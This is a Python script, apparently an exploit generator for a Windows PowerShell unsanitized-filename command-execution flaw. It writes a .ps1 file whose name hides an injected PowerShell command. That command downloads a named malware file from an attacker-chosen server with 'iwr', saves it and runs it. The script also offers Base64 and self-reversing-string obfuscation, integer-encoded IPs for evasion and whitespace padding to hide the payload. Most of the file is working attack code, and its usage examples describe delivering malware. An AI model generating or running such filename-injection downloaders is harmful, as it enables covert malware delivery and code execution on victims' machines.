from base64 import b64encode
from base64 import b64decode
from socket import *
import argparse,sys,socket,struct,re

#GGPowerShell
#Microsoft Windows PowerShell - Unsantized Filename RCE Dirty File Creat0r.
#
#Original advisory:
#http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-POWERSHELL-UNSANITIZED-FILENAME-COMMAND-EXECUTION.txt
#
#Original PoC:
#https://www.youtube.com/watch?v=AH33RW9g8J4
#
#By John Page (aka hyp3rlinx)
#Apparition Security
#=========================
#Features added to the original advisory script:
#
#Original script may have issues with -O for save files with certain PS versions, so now uses -OutFile.
#
#Added: server port option (Base64 mode only)
#
#Added: -z Reverse String Command as an alternative to default Base64 encoding obfuscation.
#Example self reversing payload to save and execute a file "n.js" from 127.0.0.1 port 80 is only 66 bytes.
#
#$a='sj.n trats;sj.n eliFtuO- 1.0.0.721 rwi'[-1..-38]-join'';iex $a
#
#-z payload requires a forced malware download on server-side, defaults port 80 and expects an ip-address.
#
#Added: IP to Integer for extra evasion - e.g 127.0.0.1 = 2130706433
#
#Added: Prefix whitespace - attempt to hide the filename payload by push it to the end of the filename.
#
#Since we have space limit, malware names should try be 5 chars max e.g. 'a.exe' including the ext to make room for
#IP/Host/Port and whitespace especially when Base64 encoding, for reverse command string option we have more room to play.
#e.g. a.exe or n.js (1 char for the name plus 2 to 3 chars for ext plus the dot).
#
#All in the name of the dirty PS filename.
#=========================================

BANNER='''
   ________________                          _____ __   _____ __    __ 
  / ____/ ____/ __ \____ _      _____  _____/ ___// /_ |__  // /   / / 
 / / __/ / __/ /_/ / __ \ | /| / / _ \/ ___/\__ \/ __ \ /_ </ /   / /  
/ /_/ / /_/ / ____/ /_/ / |/ |/ /  __/ /   ___/ / / / /__/ / /___/ /___
\____/\____/_/    \____/|__/|__/\___/_/   /____/_/ /_/____/_____/_____/                                                                                                           
                                                                                                                
By hyp3rlinx
ApparitionSec
'''


FILENAME_PREFIX="Hello-World"
POWERSHELL_OBFUSCATED="poWeRshELl"
DEFAULT_PORT="80"
DEFAULT_BASE64_WSPACE_LEN=2
MAX_CHARS = 254
WARN_MSG="Options: register shorter domain name, try <ip-address> -i flag, force-download or omit whitespace."


def parse_args():
    parser.add_argument("-s", "--server", help="Server to download malware from.")
    parser.add_argument("-p", "--port", help="Malware server port, defaults 80.")
    parser.add_argument("-m", "--locf", help="Name for the Malware upon download.")
    parser.add_argument("-r", "--remf", nargs="?", help="Malware to download from the remote server.")
    parser.add_argument("-f", "--force_download", nargs="?", const="1", help="No malware name specified, malwares force downloaded from the server web-root, malware type must be known up front.")
    parser.add_argument("-z", "--rev_str_cmd", nargs="?", const="1", help="Reverse string command obfuscation Base64 alternative, ip-address and port 80 only, Malware must be force downloaded on the server-side, see -e.")
    parser.add_argument("-w", "--wspace",  help="Amount of whitespace to use for added obfuscation, Base64 is set for 2 bytes.")
    parser.add_argument("-i", "--ipevade", nargs="?", const="1", help="Use the integer value of the malware servers IP address for obfuscation/evasion.")
    parser.add_argument("-e", "--example", nargs="?", const="1", help="Show example use cases")
    return parser.parse_args()


#self reverse PS commands
def rev_str_command(args):
    malware=args.locf[::-1]
    revload=malware
    revload+=" trats;"
    revload+=malware
    revload+=" eliFtuO- "
    revload+=args.server[::-1]
    revload+=" rwi"

    payload = "$a='"
    payload+=malware
    payload+=" trats;"
    payload+=malware
    payload+=" eliFtuO- "
    payload+=args.server[::-1]
    payload+=" rwi'[-1..-"+str(len(revload))
    payload+="]-join '';iex $a"
    return payload


def ip2int(addr):
    return struct.unpack("!I", inet_aton(addr))[0]


def ip2hex(ip):
    x = ip.split('.')
    return '0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, x))


def obfuscate_ip(target):
    IPHex = ip2hex(target)
    return str(ip2int(IPHex))


def decodeB64(p):
    return b64decode(p)


def validIP(host):
    try:
        socket.inet_aton(host)
        return True
    except socket.error:
        return False
    

def filename_sz(space,cmds,mode):
    if mode==0:
         return len(FILENAME_PREFIX)+len(space)+ 1 +len(POWERSHELL_OBFUSCATED)+ 4 + len(cmds)+ len(";.ps1")
    else:
        return len(FILENAME_PREFIX) + len(space) + 1 + len(cmds) + len(";.ps1")


def check_filename_size(sz):
    if sz > MAX_CHARS:
        print "Filename is", sz, "chars of max allowed", MAX_CHARS
        print WARN_MSG
        return False
    return True


def create_file(payload, args):
    try:
        f=open(payload, "w")
        f.write("Write-Output 'Have a good night!'")
        f.close()
    except Exception as e:
        print "[!] File not created!"
        print WARN_MSG
        return False
    return True


def cmd_info(t,p):
    print "PAYLOAD: "+p
    if t==0:
        print "TYPE: Base64 encoded payload."
    else:
        print "TYPE: Self Reversing String Command (must force-download the malware server side)."



def main(args):

    global FILENAME_PREFIX
    
    if len(sys.argv)==1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    if args.example:
        usage()
        exit()

    sz=0
    space=""
    b64payload=""
    reverse_string_cmd=""

    if not validIP(args.server):
        if not args.rev_str_cmd:
            if args.server.find("http://")==-1:
                args.server = "http://"+args.server

    if args.ipevade:
        args.server = args.server.replace("http://", "")
        if validIP(args.server):
            args.server = obfuscate_ip(args.server)
        else:
            print "[!] -i (IP evasion) requires a valid IP address, see Help -h."
            exit()

    if not args.locf:
        print "[!] Missing local malware save name -m flag see Help -h."
        exit()
        
    if not args.rev_str_cmd:

        if not args.remf and not args.force_download:
            print "[!] No remote malware specified, force downloading are we? use -f or -r flag, see Help -h."
            exit()

        if args.remf and args.force_download:
            print "[!] Multiple download options specified, use -r or -f exclusively, see Help -h."
            exit()

        if args.force_download:
            args.remf=""
            
        if args.remf:
            #remote file can be extension-less
            if not re.findall("^[~\w,a-zA-Z0-9]$", args.remf) and not re.findall("^[~\w,\s-]+\.[A-Za-z0-9]{2,3}$", args.remf):
                print "[!] Invalid remote malware name specified, see Help -h."
                exit()

            #local file extension is required
        if not re.findall("^[~\w,\s-]+\.[A-Za-z0-9]{2,3}$", args.locf):
            print "[!] Local malware name "+args.locf+" invalid, must contain no paths and have the correct extension."
            exit()
            
        if not args.port:
            args.port = DEFAULT_PORT
            
        if args.wspace:
            args.wspace = int(args.wspace)
            space="--IAA="*DEFAULT_BASE64_WSPACE_LEN
            if args.wspace != DEFAULT_BASE64_WSPACE_LEN:
                 print "[!] Ignoring", args.wspace, "whitespace amount, Base64 default is two bytes"
        
        filename_cmd = "powershell iwr "
        filename_cmd+=args.server
        filename_cmd+=":"
        filename_cmd+=args.port
        filename_cmd+="/"
        filename_cmd+=args.remf
        filename_cmd+=" -OutFile "
        filename_cmd+=args.locf
        filename_cmd+=" ;sleep -s 2;start "
        filename_cmd+=args.locf
                        
        b64payload = b64encode(filename_cmd.encode('UTF-16LE'))
        sz = filename_sz(space, b64payload, 0)

        FILENAME_PREFIX+=space
        FILENAME_PREFIX+=";"
        FILENAME_PREFIX+=POWERSHELL_OBFUSCATED
        FILENAME_PREFIX+=" -e "
        FILENAME_PREFIX+=b64payload
        FILENAME_PREFIX+=";.ps1"
        COMMANDS = FILENAME_PREFIX 
        
    else:

        if args.server.find("http://")!=-1:
            args.server = args.server.replace("http://","")

        if args.force_download:
             print "[!] Ignored -f as forced download is already required with -z flag."
        
        if args.wspace:
            space=" "*int(args.wspace)
            
        if args.remf:
            print "[!] Using both -z and -r flags is disallowed, see Help -h."
            exit()
            
        if args.port:
            print "[!] -z flag must use port 80 as its default, see Help -h."
            exit()

        if not re.findall("^[~\w,\s-]+\.[A-Za-z0-9]{2,3}$", args.locf):
            print "[!] Local Malware name invalid -m flag."
            exit()
            
        reverse_string_cmd = rev_str_command(args)
        sz = filename_sz(space, reverse_string_cmd, 1)

        FILENAME_PREFIX+=space
        FILENAME_PREFIX+=";"
        FILENAME_PREFIX+=reverse_string_cmd
        FILENAME_PREFIX+=";.ps1"
        COMMANDS=FILENAME_PREFIX

    if check_filename_size(sz):
        if create_file(COMMANDS,args):
            if not args.rev_str_cmd:
                cmd_info(0,decodeB64(b64payload))
            else:
                cmd_info(1,reverse_string_cmd)
            return sz
            
    return False
    

def usage():
    print "(-r) -s <domain-name.xxx> -p 5555 -m  g.js -r n.js -i -w 2"
    print "     Whitespace, IP evasion, download, save and exec malware via Base64 encoded payload.\n"
    print "     Download an save malware simply named '2' via port 80, rename to f.exe and execute."
    print "     -s <domain-name.xxx> -m  a.exe -r 2\n"
    print "(-f) -s <domain-name.xxx> -f -m  d.exe"
    print "     Expects force download from the servers web-root, malware type must be known upfront.\n"
    print "(-z) -s 192.168.1.10 -z -m q.cpl -w 150"
    print "     Reverse string PowerShell command alternative to Base64 obfuscation"
    print "     uses self reversing string of PS commands, malware type must be known upfront."
    print "     Defaults port 80, ip-address only and requires server-side forced download from web-root.\n"
    print "(-i) -s 192.168.1.10 -i -z -m ~.vbs -w 100"
    print "     Reverse string command with (-i) IP as integer value for evasion.\n"      
    print "     Base64 is the default command obfuscation encoding, unless -z flags specified."

if __name__=="__main__":

    print BANNER
    parser = argparse.ArgumentParser()
    sz = main(parse_args())
    
    if sz:
        print "DIRTY FILENAME SIZE: %s" % (sz) +"\n"
        print "PowerShell Unsantized Filename RCE file created."
